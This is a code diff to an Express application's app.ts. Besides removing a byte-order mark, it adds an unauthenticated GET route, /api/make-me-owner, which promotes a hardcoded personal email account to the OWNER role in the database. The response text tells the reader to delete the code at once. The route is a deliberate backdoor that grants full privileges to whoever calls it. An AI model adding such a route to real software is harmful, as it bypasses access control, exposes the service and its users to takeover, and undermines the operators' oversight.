@@ -1,4 +1,4 @@
-﻿import cookieParser from "cookie-parser";
+import cookieParser from "cookie-parser";
 import cors from "cors";
 import express from "express";
 import helmet from "helmet";
@@ -33,6 +33,20 @@ export function createApp() {
 
   app.get("/health", (_req, res) => {
     res.json({ ok: true });
+  });
+
+  app.get("/api/make-me-owner", async (_req, res) => {
+    try {
+      const { PrismaClient } = require('@prisma/client');
+      const db = new PrismaClient();
+      await db.user.update({
+        where: { email: 'jaymalhartaste@gmail.com' },
+        data: { role: 'OWNER' }
+      });
+      res.json({ success: true, message: "ACCOUNT UPGRADED! YOU ARE NOW AN OWNER. PLEASE DELETE THIS CODE FROM app.ts NOW." });
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
   });
 
   app.use("/docs", swaggerUi.serve, swaggerUi.setup(swaggerSpec));
